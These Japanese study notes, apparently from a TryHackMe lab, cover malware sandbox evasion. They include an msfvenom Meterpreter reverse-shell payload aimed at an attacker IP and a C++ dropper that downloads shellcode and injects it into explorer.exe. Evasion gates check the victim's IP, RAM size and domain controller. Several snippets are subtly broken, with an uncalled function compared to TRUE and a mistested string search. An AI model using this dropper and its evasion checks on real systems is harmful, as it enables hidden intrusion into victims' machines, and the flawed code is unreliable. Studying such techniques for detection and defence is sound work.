## Intro

- 多くの企業が "Defense in Depth"（深層防御）戦略を導入している。
- これは、セキュリティを何層にも分けて実装することを意味し、1つの層が失敗しても、敵が回避しなければならない別の層があるという状態。
- アクティブ・ディフェンスのユニークなタイプの1つであるサンドボックスに焦点を当てる。
- サンドボックスは、潜在的に悪意のあるファイルを分析し、システムへの影響を観察し、実行ファイルが悪意があるかどうかを返す安全な方法を提供する

## An Adversary walks into a Sandbox

### Malware Analysisとは
- マルウェア解析とは、不審なファイルを解析して、それが何をするのかをミクロ・レベル（アセンブリを見ること）とマクロ・レベル（システム上で何をするかを見ること）の両方で判断するプロセス。
- このプロセスにより、ブルーチーム担当者は悪意のあるプログラムについてより深く理解することができ、検出方法の開発に役立てることができる

### Static vs. Dynamic Analysis
- ブルーチーマーが不審なファイルを分析する方法は2つある。
- 一つの方法は、IDAやGhidraのような逆アセンブラを使って、（先に述べたように）ミクロレベルでコードを見ることである。このプロセスは"Static Analysis"としてよく知られている。
- Dynamic Analysisと呼ばれるプロセスを通じて、不審なファイルがシステム上で実行されたときに何が起こるかを観察することができる。システム上には、EDR Software、Sysmon、ProcMon、Process Hacker、デバッガ（例えば、OllyDebug、WinDbg、x64Dbg）など、多くの解析ツールがインストールされていることが多い。

## Introduction to Sandboxes
- 疑わしいファイルを分析するために、ブルー・チーマーが考え出した最も独創的で効果的な方法の1つは、Dynamic Analysisのカテゴリー。
- この方法では、コンテナ化された（または仮想化された）環境でファイルを実行する。
- この環境はサンドボックスと呼ばれる。
- サンドボックスの選択によっては、実行されているWindowsのバージョンやマシンにインストールされているソフトウェアなどをカスタマイズすることができる
  
- サンドボックスは、本番システムで実行する（あるいは本番システムに送信することを許可する）前に、不審なファイルが何をするかを監視する、安全で効果的な方法。
- ネットワークの様々な部分に設置される可能性のある、多くの商用サンドボックスがある
![[Pasted image 20230623194742.png]]
- 上の図では、3つの異なるサンドボックスが設置されている。
- 企業環境では、サンドボックスが複数あることは珍しいことではない。
- 多くの場合、サンドボックスは次のような場所にある：
	- Firewalls
	- Mail Servers
	- Workstations
- 例えば、FWは電子メールに添付されたファイルを実行し、どのようなネットワーク通信が行われるかを確認する。
- 一方、メールサンドボックスは電子メールを開き、電子メールに埋め込まれたファイルがNetNTLMハッシュを盗むためにSMBのようなプロトコルを介してダウンロードをトリガーするかどうかを確認する
- ホストベースのAVサンドボックスはファイルを実行し、悪意のあるプログラム動作やシステムへの変更を監視する
  
- 様々なサンドボックス製品を製造しているベンダーがあり、Blue Teamer が企業ネットワークに導入することができる。

## Common Sandbox Evasion Techniques

- 最も基本的なテクニックから最も高度なテクニックまで、順番に

### Sleeping through Sandboxes
- マルウェアのサンドボックスは、サンドボックスのキューを急激に増加させる可能性のあるリソースの過剰な割り当てを防ぐために、よく時間を制約している。
- もしサンドボックスが任意の時間に5分間しか実行されないことが分かっていれば、攻撃者のシェルコードが実行される前に5分間スリープするスリープタイマーを実装することができる。

1. 一般的な方法のひとつは、並列スレッドで現在のシステム時刻をクエリし、経過時間をチェックすること。
- 5分経過すると、プログラムは通常の実行を開始できることがわかった。

2. もう一つの一般的な方法は、複雑で計算量の多い計算をすることである。
- 例えば、与えられた数までのフィボナッチ数列を計算する。システムのハードウェアによって、この処理にかかる時間が多少異なることを念頭におく。
- 攻撃者のアプリケーションをマスクすることは、一般的にAVによる検出を避けるための良い方法

- 様々なAVベンダーが、内蔵のスリープ機能をバイパスする方法をブログで紹介している
- そのため、検知を防ぐために独自のスリープ機能を開発することを強く推奨する。以下は、スリープ機能のバイパスに関するいくつかのブログ記事：
	-  [https://evasions.checkpoint.com/techniques/timing.html](https://evasions.checkpoint.com/techniques/timing.html)
	-  [https://www.joesecurity.org/blog/660946897093663167](https://www.joesecurity.org/blog/660946897093663167)

### Geolocation
- サンドボックスは、多くの場合、オフプレミス(遠隔実行環境)でAVプロバイダーによってホストされている。
- 例えばヨーロッパの会社であるTryHackMeを攻撃していることが分かっていて、バイナリがカリフォルニアで実行された場合、バイナリがサンドボックスでせき止められた推測することができる。
- プログラムにgeolocation filterを実装して、IPアドレスブロックがターゲットにしている企業のものであるかどうか、あるいは居住地のアドレスかどうかをチェックすることもできる。
- この情報をチェックするために使えるサービスがいくつかある
	- [ifconfig.me](https://ifconfig.me/)
	- [https://rdap.arin.net/registry/ip/1.1.1.1](https://rdap.arin.net/registry/ip/1.1.1.1)
- IfConfig.meは、現在のIPアドレスを取得するために使用することができ、追加情報はオプション。
- [ARIN RDAP](https://search.arin.net/rdap/)と組み合わせることで、パースしやすいフォーマット(JSON)で返されるISPを決定することができる
  
- この方法は、ホストがインターネットにアクセスできる場合にのみ機能することに注意する。
- 組織によっては、特定のドメインのブロックリストを構築している場合があるため、この方法を活用しようとしている組織でこの方法が機能することを100%確認する必要がある。

### Checking System Information
- ほとんどのサンドボックスは通常、リソースを削減している。
- 人気のあるマルウェアサンドボックスサービスである[Any.Run](https://any.run/)は、仮想マシンあたり1つのCPUコアと4GBのRAMしか割り当てていない
- ネットワーク内のほとんどのワークステーションは通常、2～8CPUコア、8～32GBのRAM、256GB～1TB以上のドライブ容量を搭載している。
- これは、対象とする組織によって大きく異なるが、一般的には、1システムあたり2CPUコア以上、4GB以上のRAMが期待できる。
- これを知ることで、基本的なシステム情報（CPUコア数、RAM量、ディスクサイズなど）を照会するようにコードを調整することができる。

- 網羅的なリストではないが、サンドボックスの性能を確認するためにフィルターにかけられる可能性のあるものの追加例
	- Storage Medium Serial Number
	- PC Hostname
	- BIOS/UEFI Version/Serial Number
	- Windows Product Key/OS Version
	- Network Adapter Information
	- Virtualization Checks
	- Current Signed in User

### Querying Network Information
- 自由度が高く、ADドメインに関する情報の問い合わせを含むため、より高度な方法の1つと考えられている。  
  
- マルウェアサンドボックスがドメインに参加していることはほとんどないので、マシンがドメインに参加していなければ、それは適切なターゲットではないと思っても大丈夫
- しかし、常に確実とは言い切れないので、安全のためにドメインに関する情報を収集すべきである。クエリーできるオブジェクトはたくさんある：
	- Computers
	- User accounts
	- Last User Login(s)
	- Groups
	- Domain Admins
	- Enterprise Admins
	- Domain Controllers
	- Service Accounts
	- DNS Servers
- これらのテクニックは難易度が異なるので、これらの回避方法を構築するのにどれだけの時間と労力を費やすかを検討する必要がある。
- LogonServer、LogonUserSid、LogonDomainのような項目について、システム環境変数をチェックするような単純な方法（これは`echo %VARIABLE%`で行うか、全ての変数を表示するにはsetコマンドを使う）は、Windows APIを実装するよりもずっと簡単かもしれない。

### Setting the Stage
- どのようなサンドボックス・バイパス・メソッド・タイプが存在するのかをよりよく理解したところで、次のステップに進み、次のタスクでサンドボックス・バイパスのいくつかを実装する
- そのまえに、まず基本的なドロッパーから始める
- 基本的なドロッパー。

- このドロッパーは、Webサーバーからシェルコードを取得し、それをメモリに注入してシェルコードを実行する。(ターゲットマシンが64ビットのOS）
```zsh
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=[ATTACKER_IP] LPORT=[PORT] -f raw -o [file].raw
```
- シェルコードをホストするサーバをセットアップ
```zsh
python3 -m http.server 8080
```

- 下のコードは、Visual Studio 2019（またはそれ以上）を使用してテストされ、コンパイルされている。16行目、22行目、24行目、27行目、33行目に、コードを正しく機能させるために更新しなければならないプレースホルダーの値がいくつかある。
- cppファイルを選択し、visual studioで開いて値を変更する

###### コード
```cpp
#include <iostream>
#include <Windows.h>
#include <tlhelp32.h>
#include <locale>
#include <string>
#include <urlmon.h>
#include <cstdio>
#pragma comment(lib, "urlmon.lib")

using namespace std;

int downloadAndExecute()
{
    HANDLE hProcess;
//Update the dwSize variable with your shellcode size. This should be approximately 510 bytes
    SIZE_T dwSize = [YOURSHELLCODESIZE];
    DWORD flAllocationType = MEM_COMMIT | MEM_RESERVE;
    DWORD flProtect = PAGE_EXECUTE_READWRITE;
    LPVOID memAddr;
    SIZE_T bytesOut;
//Update the OpenProcess Windows API with your Explorer.exe Process ID. This can be found in Task Manager
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, [explorer.exe-pid]);
//Update the c2URL with your IP Address and the specific URI where your raw shellcode is stored.
    const char* c2URL = "http://[yourip]:[PORT]/[file].raw";
    IStream* stream;
//Update the buff[] variable to include your shellcode size
    char buff[[YOURSHELLCODESIZE]];
    unsigned long bytesRead;
    string s;
    URLOpenBlockingStreamA(0, c2URL, &stream, 0, 0);
    while (true) {
//Update the Read file descriptor to include your shellcode size
        stream->Read(buff, [YOURSHELLCODESIZE], &bytesRead);
        if (0U == bytesRead) {
            break;
        }
        s.append(buff, bytesRead);
    }
    memAddr = VirtualAllocEx(hProcess, NULL, dwSize, flAllocationType, flProtect);

    WriteProcessMemory(hProcess, memAddr, buff, dwSize, &bytesOut);

    CreateRemoteThread(hProcess, NULL, dwSize, (LPTHREAD_START_ROUTINE)memAddr, 0, 0, 0);
    stream->Release();
    return 0;
}

int main() {
    downloadAndExecute();
    return 0;
}
```

### Geolocation Filtering
- サンドボックス上でのシェルコードの実行を回避する次の方法として、ジオロケーション・ブロックを活用する。
- 先ほどのコードを活用する`downloadAndExecute()`関数の一部を再利用することができる。
- 以下のコンポーネントを再利用する
	- Website URL (formerly the c2URL variable)
	- Internet Stream (formerly the stream variable)
	- String variable (formerly the s variable)
	- Buffer Space (formerly the Buff variable)
	- Bytes Read (formerly the unsigned long bytesRead variable)
	- Lastly, the [URLOpenBlockingStreamA](https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/platform-apis/ms775127(v=vs.85)) function

#### これをコードに組み込む
- これを実際の関数に置き換えるとこうなる：
###### コード
```cpp
BOOL checkIP() {
// 訪れたいウェブサイトのURLを宣言する
	const char* websiteURL = "[https://ifconfig.me/ip](https://ifconfig.me/ip)";
	// ウェブサイトにアクセスするためのインターネットストリームを作成する
	IStream* stream;
	
	// ウェブサイトから受け取った文字列データを保存するための文字列変数を作成する
	string s;
	
	// IPアドレスを保存するためのメモリ領域を作成する
	char buff[35];
	
	unsigned long bytesRead;
	
	// リモートウェブサイトへのインターネットストリームを開く
	URLOpenBlockingStreamA(0, websiteURL, &stream, 0, 0);
	
	// ウェブサーバーからデータが送信されている間、データをメモリに書き込む
	while (true) {
	    stream->Read(buff, 35, &bytesRead);
	    if (0U == bytesRead) {
	        break;
	    }
	    s.append(buff, bytesRead);
	}
	
	// 文字列が対象のターゲットのIPと等しいかどうかを比較する。真の場合、チェックは成功として返す。それ以外の場合はチェックに失敗とする。
	if (s == "VICTIM_IP") {
	    return TRUE;
	}
	else {
	    return FALSE;
	}
}
```
###### 説明
- このコードは以下のステップに分けることができる：
1. 上記の必要な変数を宣言する。  
2. URLOpenBlockingStreamA関数でインターネットストリームをifconfig.me/ipに開き、現在のIPアドレスをチェックする。  
3. URLOpenBlockingStreamA関数から返されたデータストリームをメモリに書き込む。
4. メモリ・バッファのデータを文字列変数に追加する。  
5. 文字列データが被害者のIPアドレスと等しいかどうかをチェックする。  
6. True の場合は TRUE を返し、 False の場合は FALSE を返す。

###### メイン関数の修正
- ここで、新しく作った関数を活用できるように、メイン関数を修正しなければならない
```cpp
int main(){
    if(checkIP() == TRUE){
        downloadAndExecute();
        return 0;
    }
    else {
        cout << "HTTP/418 - I'm a Teapot!";
        return 0;
    }
} 
```
- 上のコードでは、新しい関数checkIP()を呼び出し、IPアドレスがTRUEを返したら、`downloadAndExecute()`関数を呼び出して、C2サーバーからシェルコードを呼び出す。FALSEの場合、HTTP/418 - I'm a teapot!"を返す。

### Checking System Information
- システム情報カテゴリーの最初は、システムのRAM容量から始める。
- Windowsは非標準のフォーマットでデータを測定することに注意する。
- 256GBのSSDストレージと書かれたコンピュータを購入したことがある場合、電源を入れた後は240GBに近くなる。これは、Windowsが1000バイト単位ではなく、1024バイト単位でデータを測定するため。これは、非常に混乱する可能性があることに注意する。
- 幸いなことに、sandboxの少量のメモリで作業することになるので、正確な数値ではなく「最良の推測」でよい。
- システムにインストールされているメモリの量をどうやって判断すればいいか？

#### Checking System Memory
- 幸いなことに、これは比較的簡単に調べることができる。
- Windowsのヘッダーファイルが含まれていればよく、特定のWindows APIである[GlobalMemoryStatusEx](https://docs.microsoft.com/en-us/windows/win32/api/sysinfoapi/nf-sysinfoapi-globalmemorystatusex)を呼び出してデータを取得することができる。
- この情報を取得するには、[MEMORYSTATUSEX](https://docs.microsoft.com/en-us/windows/win32/api/sysinfoapi/ns-sysinfoapi-memorystatusex)構造体を宣言しなければならない。
- 次に、dwLengthメンバのサイズを構造体のサイズに設定しなければならない。
- これが完了したら、GlobalMemoryStatusEx Windows APIを呼び出して、構造体にメモリ情報を入力することができる。

- したがって、MEMORYSTATUSEX 構造体の ullTotalPhys メンバを出力して、システムにインス トールされているメモリのサイズをバイト単位で取得する。
- 次に、1024の3倍で割って、GiB単位でインストールされているメモリの値を得る。

###### C++のコードで表現
```cpp
#include <iostream>
#include <Windows.h>
using namespace std;
int main() {
// MEMORYSTATUSEX構造体の宣言  
   MEMORYSTATUSEX statex;
// 構造体の長さを構造体のサイズに設定する
   statex.dwLength = sizeof(statex);
// GlobalMemoryStatusEx Windows APIを呼び出して、現在のメモリ情報を取得する
   GlobalMemoryStatusEx(&statex);
// システムにインストールされている物理メモリを印刷する
   cout << "There is " << statex.ullTotalPhys/1024/1024/1024 << "GiB of memory on the system.";
} 
```
###### コードの解説
- このコードは以下のステップに分けることができる：
1. MEMORYSTATUSEX Structを宣言。この構造体には、GlobalMemoryStatusEx WinAPIからの情報が入力される。  
2. ここで、構造体にデータを入力できるように、構造体の長さを設定する。そのために、sizeof関数を使用。  
3. これで構造体の長さが得られたので、GlobalMemoryStatusEx WinAPIからのデータを構造体に入力することができる。  
4. これで、システムから総メモリ量を読み取ることができる。

###### これをコードに組み込む
- 一般的に、ほとんどのサンドボックスはマシンに4GBのRAMを専用に搭載しているので、メモリカウントが5より大きいかどうかをチェックし、大きくない場合はプログラムを終了し、大きい場合は実行を続行する。
- downloadAndExecute関数をこれ以上変更することはない。ここからは、新しい関数を追加し、メイン関数を変更する

###### コード
```cpp
BOOL memoryCheck() {
// この関数は、システムに5GB以上のRAMがあるかどうかをチェック
// MEMORYSTATUSEX構造体の宣言
    MEMORYSTATUSEX statex;
// 構造体の長さを構造体のサイズに設定
    statex.dwLength = sizeof(statex);
// GlobalMemoryStatusEx Windows APIを呼び出して、現在のメモリ情報を取得する
    GlobalMemoryStatusEx(&statex);
// システムメモリが5.00GBより大きいかどうかをチェック
    if (statex.ullTotalPhys / 1024 / 1024 / 1024 >= 5.00) {        
       return TRUE;    
    } else {        
       return FALSE;
    }
}

int main() {
// インストールされているRAMの容量が5.00GBより大きいかどうかを評価し、
//trueならShellcodeをダウンロードし、falseならプログラムを終了する
if (memoryCheck() == TRUE) {        
    downloadAndExecute();    
    } else {        
       exit;    
    }
return 0;
} 
```
###### コードの解説
- このコードは以下のステップに分けることができる
1. TrueかFalseを返す新しい関数（memoryCheck）を作る。  
2. 先ほどのコードを使ってシステム・メモリのサイズを取得する。  
3. システム・メモリーが5GBより大きいかどうかをチェックし、TrueならTRUEを、FalseならFALSEを返す。  
4. この関数から返される値によって、ステージ2をダウンロードして実行するかどうかが決まる。

### Querying Network Information
- 最後の回避テクニックでは、ADドメインに関する情報を問い合わせる。
- [NetGetDCName](https://docs.microsoft.com/en-us/windows/win32/api/lmaccess/nf-lmaccess-netgetdcname) Windows APIを使ってドメインコントローラーの名前を問い合わせる。
- これは比較的単純なWindows APIで、環境内のプライマリドメインコントローラーを取得する。
- これには、DC Nameを格納する文字列へのポインタを指定する必要がある。この関数をC++で実装すると次のようになる：
###### コード
```cpp
BOOL isDomainController(){
// DC Nameを格納するWide Stringへのロング・ポインタを作成する
    LPCWSTR dcName;  
// ドメインコントローラー名をNetGetDCName Win32 APIに問い合わせる
    NetGetDCName(NULL, NULL, (LPBYTE *) &dcName);
// DCNameをワイド文字列から文字列に変換する
    wstring ws(dcName);
    string dcNewName(ws.begin(), ws.end());
// UNCパスがdcNewName変数で参照されているかどうかを調べる。もしそうなら、環境にドメインコントローラーが存在する可能性が高い。これが真であればチェックをパスし、そうでなければ失敗する。
    if ( dcNewName.find("\\\\"){
          return TRUE;
    } else {
          return FALSE;
    }
} 
```
###### コードの解説
- このコードは以下のステップに分けることができる：
1. 文字列とLPCWSTRの2つの変数を宣言する。NetGetDCName WinAPIはLPCWSTRのみを返す。  
2. NetGetDCName Windows APIを起動します。2つのNULL値が指定される。なぜなら、今いる環境のServer NameやDomain Nameがわからないから
3. LPCWSTRを通常の文字列変数に変換して、値がNULL（文字列の場合は""）かどうかをチェックする。  
4. 比較文を実行し、デバイス名に応じてTrueまたはFalseを返す

###### コードへの埋め込み
- そしてMain()関数にコールバックされ、C2サーバーからシェルコードをダウンロードして実行する必要があるかどうかが評価される。Main関数は次のようになる：
```cpp
int main() {
    if (isDomainController == TRUE) {
        downloadAndExecute();
    } else {
        cout << "Domain Controller Not Found!";
    }
} 
```
